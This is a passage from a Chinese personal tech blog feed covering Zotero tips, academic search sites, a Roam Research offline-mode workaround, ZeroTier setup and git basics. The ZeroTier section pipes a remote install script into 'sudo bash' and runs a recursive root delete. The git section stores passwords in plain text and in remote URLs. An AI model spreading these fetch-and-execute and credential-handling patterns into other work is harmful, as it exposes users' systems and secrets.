class="headerlink" title="同一位置插入多篇文献"></a>同一位置插入多篇文献</h3><p>点击经典视图左下方的Multiple Sources<br>然后，通过下图所示的箭头，即可选择多篇文献。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651112216981_0.png"></p><h3 id="修改已插入文献"><a href="#修改已插入文献" class="headerlink" title="修改已插入文献"></a>修改已插入文献</h3><p>有的时候，我们发现插入文献的题录信息不全，或者在文章校对（Proof）时，编辑让你补全缺失的卷号期号之类的信息，此时我们就需要在Zotero中找到该文献，然后修改题录信息。<br>但是可能存在重复的导致不好定位是引用了哪个。</p><h4 id="Word"><a href="#Word" class="headerlink" title="Word"></a>Word</h4><p>将光标定位到引用序号处，然后点击菜单栏的Add&#x2F;Edit Citation。会弹出下方的搜索框。（需提前切换到非经典视图）。<br>单击想要修改的文献，会出现下图所示的框框，然后点击Open in My library。</p><h5 id="切换参考文献排版格式"><a href="#切换参考文献排版格式" class="headerlink" title="切换参考文献排版格式"></a>切换参考文献排版格式</h5><p>打开Word，点击Zotero加载项下的Document Preferences。选择其他参考文献排版格式，然后点击OK。</p><h3 id="提取Word中的参考文献"><a href="#提取Word中的参考文献" class="headerlink" title="提取Word中的参考文献"></a>提取Word中的参考文献</h3><h4 id="Reference-Extractor"><a href="#Reference-Extractor" class="headerlink" title="Reference Extractor"></a>Reference Extractor</h4><p>访问网站<a href="https://rintze.zelle.me/ref-extractor/">Reference Extractor</a><br>按照下图所示，点击选择文件，将前面保存到本地的Word文档上传到网站<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651112571504_0.png"><br>我们点击Select in Zotero，并选择Select xx item(s) for user library xxxx。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651112606981_0.png"></p><h3 id="Zutilo-1"><a href="#Zutilo-1" class="headerlink" title="Zutilo"></a>Zutilo</h3><p>首先在电脑任意的地方（比如微信的文件传输助手），将一个标签文字（比如叫做Citation）拷贝到系统剪贴板。<br>然后，在上述的文献选中状态，右击，并选择Zutilo–&gt;Paste tags from clipboard（需要在Zutilo的首选项中调出该菜单）。<br>此时，所有参考文献都被赋予了Citation标签. 接着我们只需要通过Citation标签来筛选出所有参考文献即可。</p><h2 id="插件修改"><a href="#插件修改" class="headerlink" title="插件修改"></a>插件修改</h2><h3 id="xpi"><a href="#xpi" class="headerlink" title="xpi"></a>xpi</h3><p>.xpi其实一种压缩文件格式，就如同我们常用的.zip等压缩格式一样。</p><blockquote><p>需要使用支持的解压软件进行打开才行，直接压缩包内修改。</p></blockquote><p>插件都是使用<code>javascript</code>实现。</p><h2 id="PDF"><a href="#PDF" class="headerlink" title="PDF"></a>PDF</h2><h3 id="迁移其他pdf注释"><a href="#迁移其他pdf注释" class="headerlink" title="迁移其他pdf注释"></a>迁移其他pdf注释</h3><p>将在其他阅读器中标注的文献使用<code>zotero</code>自带的<code>PDF</code>阅读器打开的时候，这些批注都是锁定的，想要编辑需要点击文件菜单下的「Import Annotations」<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1651200620994_0.png"></p><h3 id="将批注保存到PDF"><a href="#将批注保存到PDF" class="headerlink" title="将批注保存到PDF"></a>将批注保存到PDF</h3><p>Zotero里的批注一般是不跟随PDF的，所以需要将其绑定到PDF上才能将这个带批注的PDF共享给别人。只需要点击文件夹菜单下的「Store Annotations in File」。<br>这个功能好像被取消内置了，但是在插件 Zotero IF中封装了。</p><h3 id="通过注释添加条目"><a href="#通过注释添加条目" class="headerlink" title="通过注释添加条目"></a>通过注释添加条目</h3><p>对应右上角的加号，里面2个选项，其中一个就是通过注释添加条目。会在Zotero下对应的位置生成注释的条目信息</p><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/20220507173714.png"></p><p>在构建的条目里，可用为这个笔记添加标签和相关文献的操作。</p><h1 id="卡卡西"><a href="#卡卡西" class="headerlink" title="卡卡西"></a>卡卡西</h1><p><a href="https://www.bilibili.com/video/BV1KQ4y1i7VP?spm_id_from=333.337.search-card.all.click">化工之光</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzAxNzgyMDg0MQ==&mid=2650455737&idx=1&sn=709c347aa67b8807713fe473f0bca948&chksm=83d1a37fb4a62a69cfdcd0afdd50ecb2a63a86ef529c17614c30c3dfb94f8804a41644e2603c&scene=178&cur_album_id=1319074508795641857#rd">青柠学术</a></p>]]></content>
      
      
      <categories>
          
          <category> 学术 </category>
          
          <category> 差生文具多 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文献工具</title>
      <link href="/2022/04/30/%E6%96%87%E7%8C%AE%E5%B7%A5%E5%85%B7/"/>
      <url>/2022/04/30/%E6%96%87%E7%8C%AE%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="connected-papers"><a href="#connected-papers" class="headerlink" title="connected papers"></a>connected papers</h1><p><a href="https://www.connectedpapers.com/">Connected Papers | Find and explore academic papers</a><br>基于SematicScholar数据库对文献之间关系进行分析的网络工具。</p><h1 id="arvix提速"><a href="#arvix提速" class="headerlink" title="arvix提速"></a>arvix提速</h1><p>将<a href="https://arxiv.org/abs/%E6%9B%BF%E6%8D%A2%E4%B8%BAhttp://xxx.itp.ac.jcn/abs/">https://arxiv.org/abs/替换为http://xxx.itp.ac.jcn/abs/</a></p><h1 id="关联视频到arvix"><a href="#关联视频到arvix" class="headerlink" title="关联视频到arvix"></a>关联视频到arvix</h1><p>直接在arxiv上显示相关论文的提供视频<br><a href="https://mp.weixin.qq.com/s/JwRQOFXc_j6NT3Wo6hwxKQ">arXiv论文如何一键链接解读视频，这个浏览器扩展帮你实现</a></p><h1 id="出版社方便查找论文-—-doi"><a href="#出版社方便查找论文-—-doi" class="headerlink" title="出版社方便查找论文 — doi"></a>出版社方便查找论文 — doi</h1><h2 id="springer"><a href="#springer" class="headerlink" title="springer"></a>springer</h2><p><a href="https://link.springer.com/">Home - Springer</a></p><h2 id="semanticscholar"><a href="#semanticscholar" class="headerlink" title="semanticscholar"></a>semanticscholar</h2><p><a href="https://www.semanticscholar.org/">Semantic Scholar | AI-Powered Research Tool</a></p><h1 id="查找相关期刊的集合网站"><a href="#查找相关期刊的集合网站" class="headerlink" title="查找相关期刊的集合网站"></a>查找相关期刊的集合网站</h1><p><a href="https://www.researchgate.net/post/Journal_Finder_and_Suggester">整体来源</a></p><h2 id="Elsevier的相关期刊查询"><a href="#Elsevier的相关期刊查询" class="headerlink" title="Elsevier的相关期刊查询"></a>Elsevier的相关期刊查询</h2><p><a href="https://journalfinder.elsevier.com/">Elsevier® JournalFinder</a></p><h2 id="Taylor-amp-Francis-Journal-Suggester"><a href="#Taylor-amp-Francis-Journal-Suggester" class="headerlink" title="Taylor &amp; Francis Journal Suggester"></a>Taylor &amp; Francis Journal Suggester</h2><p><a href="https://authorservices.taylorandfrancis.com/publishing-open-access/open-access-cost-finder/">Open access cost finder - Author Services</a></p><h2 id="Springer-Nature-Journal-Suggester"><a href="#Springer-Nature-Journal-Suggester" class="headerlink" title="Springer Nature Journal Suggester"></a>Springer Nature Journal Suggester</h2><p><a href="https://journalsuggester.springer.com/">Springer Journal Suggester</a></p><h2 id="Wiley-Journal-Finder"><a href="#Wiley-Journal-Finder" class="headerlink" title="Wiley Journal Finder"></a>Wiley Journal Finder</h2><p><a href="https://journalfinder.wiley.com/search?type=match">Wiley Journal Finder</a></p><h2 id="IEEE-Journal-Recommender"><a href="#IEEE-Journal-Recommender" class="headerlink" title="IEEE Journal Recommender"></a>IEEE Journal Recommender</h2><p><a href="https://publication-recommender.ieee.org/home">IEEE Publication Recommender</a></p><h2 id="Sage-Journal-Selector"><a href="#Sage-Journal-Selector" class="headerlink" title="Sage Journal Selector"></a>Sage Journal Selector</h2><h2 id="Web-of-Science-Master-List"><a href="#Web-of-Science-Master-List" class="headerlink" title="Web of Science Master List"></a>Web of Science Master List</h2><p><a href="https://mjl.clarivate.com/home">Web of Science Master Journal List</a></p><h2 id="EndNote-Match"><a href="#EndNote-Match" class="headerlink" title="EndNote Match"></a>EndNote Match</h2><p><a href="https://endnote.com/product-details/manuscript-matcher/">Manuscript Matcher | EndNote</a></p><h2 id="Journal-Guide"><a href="#Journal-Guide" class="headerlink" title="Journal Guide"></a>Journal Guide</h2><p><a href="https://www.journalguide.com/">JournalGuide - Home</a></p><h2 id="Publish-or-Flourish-Open-Access"><a href="#Publish-or-Flourish-Open-Access" class="headerlink" title="Publish or Flourish Open Access"></a>Publish or Flourish Open Access</h2><p><a href="http://flourishoa.org/">Flourish | OpenAccess Journal Finder</a></p><h1 id="医学文献查找推荐"><a href="#医学文献查找推荐" class="headerlink" title="医学文献查找推荐"></a>医学文献查找推荐</h1><p>可以查看影响因子的文献查找<br><a href="https://www.pubmed.pro/home">PubMedPro - 可以显示IF影响因子的文献检索网站</a></p><h1 id="Letpub"><a href="#Letpub" class="headerlink" title="Letpub"></a>Letpub</h1><p>查期刊的影响因子<br><a href="https://www.letpub.com.cn/index.php?page=journalapp">最新SCI期刊查询及投稿分析系统（2020-2021年） - LetPub</a></p><h1 id="根据名字查找对应的doi"><a href="#根据名字查找对应的doi" class="headerlink" title="根据名字查找对应的doi"></a>根据名字查找对应的doi</h1><p><a href="https://dx.doi.org/">Resolve a DOI Name</a></p><h1 id="IEEE模板查找"><a href="#IEEE模板查找" class="headerlink" title="IEEE模板查找"></a>IEEE模板查找</h1><p><a href="https://journals.ieeeauthorcenter.ieee.org/create-your-ieee-journal-article/">Create Your IEEE Journal Article - IEEE Author Center Journals</a></p><h1 id="scihub"><a href="#scihub" class="headerlink" title="scihub"></a>scihub</h1><p><a href="https://www.sci-hub.ren/">Sci-Hub: removing barriers in the way of science</a></p><h1 id="会议查询"><a href="#会议查询" class="headerlink" title="会议查询"></a>会议查询</h1><p><a href="http://www.searchconf.net/conf/ccf/">http://www.searchconf.net/conf/ccf/</a> ：选择主页，可以按时间查找近期的会议，包括投稿时间，截止时间。</p><p>AI顶会的 deadline <a href="https://aideadlin.es/?sub=ML,CV,NLP">倒计时工具</a> ： 包含B会！！C会！！都是CCF推荐！！</p>]]></content>
      
      
      <categories>
          
          <category> 学术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Roam Research</title>
      <link href="/2022/04/25/Roam-Research/"/>
      <url>/2022/04/25/Roam-Research/</url>
      
        <content type="html"><![CDATA[<h1 id="免费使用的方式"><a href="#免费使用的方式" class="headerlink" title="免费使用的方式"></a>免费使用的方式</h1><blockquote><p>使用这种方法能够使用RR，但是无法使用RR的远程服务，只能使用本地库。</p></blockquote><p>首先需要下载一个RR的客户端。创建一个账号，这个时候如果没有付费是没有权限使用的。</p><h2 id="构建本地库"><a href="#构建本地库" class="headerlink" title="构建本地库"></a>构建本地库</h2><p>view-&gt; Toggle Developer Tools。右侧会出现控制台，选择Console，输入</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = <span class="string">&quot;https://roamresearch.com/#/offline/test&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650855104822_0.png">)<br>通过offline来调用本地知识库，只需要在后面增加一个库的名字, 回车<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650855293950_0.png"><br>之后就可以正常使用本地的数据库，也可以设置备份，通过backup可以查看本地的备份位置。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650855340536_0.png"><br>之后就可以愉快的使用了。</p>]]></content>
      
      
      <categories>
          
          <category> 差生文具多 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记软件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zerotier</title>
      <link href="/2022/04/19/zerotier/"/>
      <url>/2022/04/19/zerotier/</url>
      
        <content type="html"><![CDATA[<p>#linux</p><blockquote><p>免费的内网组网工具，不同于nps等使用内网穿透的形式构建局域网。</p></blockquote><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="申请帐号"><a href="#申请帐号" class="headerlink" title="申请帐号"></a>申请帐号</h2><p>在官网上申请帐号，然后创建网络。选择private，这样只有在官网认证成功的IP才能成功组网，防止被人入侵。</p><h2 id="Linux上安装"><a href="#Linux上安装" class="headerlink" title="Linux上安装"></a>Linux上安装</h2><h2 id="使用官网命令安装"><a href="#使用官网命令安装" class="headerlink" title="使用官网命令安装"></a>使用官网命令安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://install.zerotier.com | sudo bash</span><br></pre></td></tr></table></figure><p>将当前设备加入zerotier局域网</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ./zerotier-cli join [network id]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">必须要有sudo，不然会报错</span></span><br></pre></td></tr></table></figure><p>启动<code>zerotier</code>服务，并设置为开启自启</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start zerotier-one.service</span><br><span class="line">sudo systemctl enable zerotier-one.service</span><br></pre></td></tr></table></figure><h2 id="手动构建"><a href="#手动构建" class="headerlink" title="手动构建"></a>手动构建</h2><p>使用官网的脚本无法进行安装，这个时候可以直接下载github上的包，使用make进行安装。<br>安装完成之后，在ZeroTierOne目录下会生成<code>zerotier-cli</code>命令，通过这个命令去进行申请组网：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ./zerotier-cli join [network id]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">必须要有sudo，不然会报错</span></span><br></pre></td></tr></table></figure><p>之后就是去Zerotier官网，在申请的网络里，找到members，将对应的IP打上勾就完成了。<br>Zerotier启动的时候会默认占用9993端口。</p><h3 id="手动开启"><a href="#手动开启" class="headerlink" title="手动开启"></a>手动开启</h3><p>join是第一次加入网络时候的操作，之后重启电脑的时候需要使用以下命令才能执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./zerotier-one -d</span><br></pre></td></tr></table></figure><p>都是在ZerotierOne目录下执行</p><h3 id="自动启动"><a href="#自动启动" class="headerlink" title="自动启动"></a>自动启动</h3><blockquote><p>不建议使用，因为不稳定，还是直接通过命令行安装比较好</p></blockquote><p>需要将<code>zerotier-one</code> 复制到<code>/usr/bin</code>目录下，这样就可以在全局模型是调用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">ExecStart=/usr/bin/zerotier-one</span><br></pre></td></tr></table></figure><p>之后需要将service服务复制到service文件夹下，保证与其他服务的权限一致。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">service在ZeroTierOne/debian文件夹下</span></span><br><span class="line">sudo cp zerotier-one.service /usr/lib/systemd/system</span><br></pre></td></tr></table></figure><p>设置默认启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl enable zerotier-one.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">直接启动</span></span><br><span class="line">sudo systemctl start zerotier-one.service</span><br></pre></td></tr></table></figure><h1 id="提速"><a href="#提速" class="headerlink" title="提速"></a>提速</h1><h2 id="Zerotier-Moon"><a href="#Zerotier-Moon" class="headerlink" title="Zerotier Moon"></a>Zerotier Moon</h2><blockquote><p>只需要有一个公网 IP 即可，起到辅助构建P2P连接的功能，不会进行数据的转发。</p></blockquote><h2 id="安装Zerotier"><a href="#安装Zerotier" class="headerlink" title="安装Zerotier"></a>安装Zerotier</h2><p>在云服务器上也许要安装Zerotier，这个时候可以使用官网的脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://install.zerotier.com | sudo bash</span><br></pre></td></tr></table></figure><p>不知道为什么云服务器就不会出错。默认会安装在<code>var/lib/zerotier-one</code>。并将其加入到同一个虚拟网络中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo zerotier-cli join xxxxxxxx</span><br></pre></td></tr></table></figure><h2 id="配置Moon"><a href="#配置Moon" class="headerlink" title="配置Moon"></a>配置Moon</h2><p>进入zerotier程序所在目录，默认为<code>var/lib/zeroiter-one</code>。生成<code>moon.json</code> 配置文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo zerotier-idtool initmoon identity.public &gt;&gt; moon.json</span><br></pre></td></tr></table></figure><p>编辑<code>moon.json</code> 配置文件。将配置文件中的 <code>&quot;stableEndpoints&quot;: []</code> 修改成 <code>&quot;stableEndpoints&quot;: [&quot;ServerIP/9993&quot;]</code>，将 <code>ServerIP</code> 替换成云服务器的公网IP。</p><h2 id="生成-moon-文件"><a href="#生成-moon-文件" class="headerlink" title="生成.moon 文件"></a>生成.moon 文件</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo zerotier-idtool genmoon moon.json</span><br></pre></td></tr></table></figure><p>将生成的<code>000000xxxxxxxxxx.moon</code> 移动到<code>moons.d</code> 目录(目录不存在则创建)。</p><blockquote><p>.moon 配置文件的名一般为10个前导零+本机的节点ID</p></blockquote><p>重启<code>zeroiter-one</code> 服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart zerotier-one</span><br></pre></td></tr></table></figure><h2 id="使用Moon"><a href="#使用Moon" class="headerlink" title="使用Moon"></a>使用Moon</h2><p>通过以上方式，云服务器就具备了Moon的功能。之后就需要在其他设备上指定这个Moon中继。</p><blockquote><p>普通的 Zerotier 成员使用 Moon 有两种方法，第一种方法是使用 zerotier-cli orbit 命令直接添加 Moon 节点ID；第二种方法是在 zerotier-one 程序的根目录创建moons.d文件夹，将 xxx.moon 复制到该文件夹中。本文使用第一种</p></blockquote><h3 id="Linux系统下使用Moon"><a href="#Linux系统下使用Moon" class="headerlink" title="Linux系统下使用Moon"></a>Linux系统下使用Moon</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo zerotier-cli orbit [Moon节点ID] [Moon节点ID]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">之后查看是否成功，当云服务器对应的ID成为Moon则成功</span></span><br><span class="line">sudo zerotier-cli listpeers</span><br></pre></td></tr></table></figure><h3 id="Windows-系统下使用-Moon"><a href="#Windows-系统下使用-Moon" class="headerlink" title="Windows 系统下使用 Moon"></a>Windows 系统下使用 Moon</h3><blockquote><p>Windows 系统的默认程序目录位于 <code>C:\Program Files (x86)\ZeroTier\One</code></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以管理员身份打开 PowerShell</span></span><br><span class="line">zerotier-cli.bat orbit [Moon节点ID] [Moon节点ID]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查是否添加成功</span></span><br><span class="line">zerotier-cli.bat listpeers</span><br></pre></td></tr></table></figure><h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>zerotier-cli listnetworks</td><td>查看网络是否加入到了虚拟网络中</td></tr><tr><td>zerotier-cli listpeers</td><td>查看所有的节点的信息</td></tr><tr><td>zerotier-cli leave [Network ID]</td><td>离开指定的Network</td></tr></tbody></table><h1 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h1><p>当前并不知道如何重新生成机器ID，所以如果无法在<code>Zerotier</code>官网删除本台机器的机器ID，那么就可以通过卸载<code>Zerotier</code>并重新安装的方式获取一个新的机器ID。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除软件</span></span><br><span class="line">sudo dpkg -P zerotier-one</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除zerotier-one文件，该文件存储来address地址，再次安装就会获得新的ID</span></span><br><span class="line">sudo rm -rf /var/lib/zerotier-one/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 内网穿透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git教程</title>
      <link href="/2022/04/18/git%E6%95%99%E7%A8%8B/"/>
      <url>/2022/04/18/git%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="用户设置"><a href="#用户设置" class="headerlink" title="用户设置"></a>用户设置</h1><h2 id="设置提交用户识别"><a href="#设置提交用户识别" class="headerlink" title="设置提交用户识别"></a>设置提交用户识别</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#local设置当前项目</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#global全局用户设置，在用户家目录下，一般以项目优先</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不加local其实也是默认为local设置</span></span><br><span class="line">git config --<span class="built_in">local</span> user.name <span class="string">&quot;*&quot;</span></span><br><span class="line">git config --<span class="built_in">local</span> user.email <span class="string">&quot;*&quot;</span></span><br></pre></td></tr></table></figure><h2 id="查看当前库情况"><a href="#查看当前库情况" class="headerlink" title="查看当前库情况"></a>查看当前库情况</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> .git/config</span><br></pre></td></tr></table></figure><h1 id="免密登入"><a href="#免密登入" class="headerlink" title="免密登入"></a>免密登入</h1><h2 id="使用ssh密钥"><a href="#使用ssh密钥" class="headerlink" title="使用ssh密钥"></a>使用ssh密钥</h2><p>需要创建ssh密钥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;name@gmail.com&quot;</span><br></pre></td></tr></table></figure><p>t 指定加密形式，这里使用了rsa加密，C为comment，可以不需要，类似于git中提示。<br>上述命令会在 .ssh 文件下生成一对rsa的公私密钥，之后只需要将公钥发送到指定的服务器即可。</p><h3 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h3><p>直接拷贝pub公钥中的内容到指定服务器 .ssh 文件下的authorized_keys里即可。</p><h3 id="ssh-copy-id"><a href="#ssh-copy-id" class="headerlink" title="ssh-copy-id"></a>ssh-copy-id</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-copy-id -i ~/.ssh/id_rsa.pub user@server</span><br></pre></td></tr></table></figure><p>会自动将公钥复制到服务器的authorized_keys中。</p><h3 id="配置config"><a href="#配置config" class="headerlink" title="配置config"></a>配置config</h3><p>上述就已经能够完成免密登入，但是还需要输入<code>ssh user@server</code>的方式进行登入。为了简化登入过程，可以配置<code>.ssh/config</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Host 18</span><br><span class="line">HostName [ip]</span><br><span class="line">Port 22</span><br><span class="line">User admin</span><br><span class="line">IdentityFile &quot;/home/admin/.ssh/id_rsa&quot;</span><br></pre></td></tr></table></figure><h2 id="https"><a href="#https" class="headerlink" title="https"></a>https</h2><p>通过存储密码的形式<br>暂时存储密码</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global credential.helper cache</span><br></pre></td></tr></table></figure><p>自定义时间</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config credential.helper &#x27;cache --timeout=<span class="number">3600</span>&#x27;</span><br></pre></td></tr></table></figure><p>长期存储</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global credential.helper store</span><br></pre></td></tr></table></figure><p>使用远程库直接实现<br>增加远程地址的时候带上密码</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http<span class="punctuation">:</span><span class="comment">//yourname:password@git.oschina.net/name/project.git</span></span><br></pre></td></tr></table></figure><p>直接作为远程库</p><h1 id="提升访问速度"><a href="#提升访问速度" class="headerlink" title="提升访问速度"></a>提升访问速度</h1><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3MzU2Njk3MA==&mid=2247492743&idx=1&sn=55a356f362dce16b176a31c967325ef7&source=41#wechat_redirect">来源</a><br>GitHub 镜像访问<br>这里提供两个最常用的镜像地址：<br><strong><a href="https://github.com.cnpmjs.org/">https://github.com.cnpmjs.org</a></strong><br><strong><a href="https://hub.fastgit.org/">https://hub.fastgit.org</a></strong><br>也就是说上面的镜像就是一个克隆版的 GitHub，你可以访问上面的镜像网站，网站的内容跟 GitHub 是完整同步的镜像，然后在这个网站里面进行下载克隆等操作。<br>GitHub 文件加速<br>利用 Cloudflare Workers 对 github release 、archive 以及项目文件进行加速，部署无需服务器且自带CDN.<br><strong><a href="https://gh.api.99988866.xyz/">https://gh.api.99988866.xyz</a></strong><br><strong><a href="https://g.ioiox.com/">https://g.ioiox.com</a></strong><br>以上网站为演示站点，如无法打开可以查看开源项目：gh-proxy-GitHub(<a href="https://hunsh.net/archives/23/">https://hunsh.net/archives/23/</a>) 文件加速自行部署。<br>Github 加速下载<br>只需要复制当前 GitHub 地址粘贴到输入框中就可以代理加速下载！<br>地址：<a href="http://toolwa.com/github/">http://toolwa.com/github/</a><br>加速你的 Github（有问题）<br><a href="https://github.zhlh6.cn/">https://github.zhlh6.cn</a><br>输入 Github 仓库地址，使用生成的地址进行 git ssh 等操作，最好不要用自己的库<br>谷歌浏览器 GitHub 加速插件(推荐-方便快捷)<br>如果可以直接访问谷歌商店，可以下载GitHub 加速工具，安装。<br>不方便的可以这里下载安装：<br><code>链接</code>: <a href="https://pan.baidu.com/s/1rkSaN46THUlHYrjseSma-w">https://pan.baidu.com/s/1rkSaN46THUlHYrjseSma-w</a><br><code>提取码</code>: 8k1w<br>GitHub raw 加速<br>GitHub raw 域名并非 github.com 而是 raw.githubusercontent.com，上方的 GitHub 加速如果不能加速这个域名，那么可以使用 Static CDN 提供的反代服务。<br>将 raw.githubusercontent.com 替换为 raw.staticdn.net 即可加速。<br>通过 Gitee 中转 fork 仓库下载<br>不好用<br>修改hosts<br>有时候感觉也不快</p><h1 id="基础使用方法"><a href="#基础使用方法" class="headerlink" title="基础使用方法"></a>基础使用方法</h1><blockquote><p>建议配合lazygit使用，快捷舒服。</p></blockquote><p>除非提交或者清空缓冲池，否则在切换分支的时候缓冲池的内容会保留。</p><table><thead><tr><th>Name</th><th>功能</th><th>可选参数</th><th>参数解析</th></tr></thead><tbody><tr><td>git clone</td><td>克隆远程库</td><td>o&#x2F;master</td><td>表示远程分支，在克隆完成的时候自动完成HEAD分离，因为不能对远程直接操作，所以o&#x2F;master不会随着HEAD移动</td></tr><tr><td>git status</td><td>状态查看</td><td></td><td></td></tr><tr><td>git add</td><td>将修改提交到缓冲池</td><td>.</td><td>全部文件</td></tr><tr><td></td><td></td><td>&lt;文件名&gt;</td><td>指定文件</td></tr><tr><td>git rm</td><td>删除</td><td>-cache</td><td>将缓冲池中的提交删除</td></tr><tr><td></td><td></td><td>-r</td><td>将本地文件和缓冲池中的文件一起删除，r表示全部文件，只能通过reset还原</td></tr><tr><td></td><td></td><td>-f &lt;文件&gt;</td><td>将记录中的文件删除，如果没有记录是无法删除的，但是如果提交到了缓冲区中，可以使用-f来进行删除</td></tr><tr><td>git commit</td><td>提交到本地库</td><td>-m</td><td>添加说明文档</td></tr><tr><td></td><td></td><td>–amend</td><td>能将当前次的提交归并到上一次提交中，避免生成一个新的节点</td></tr><tr><td>git 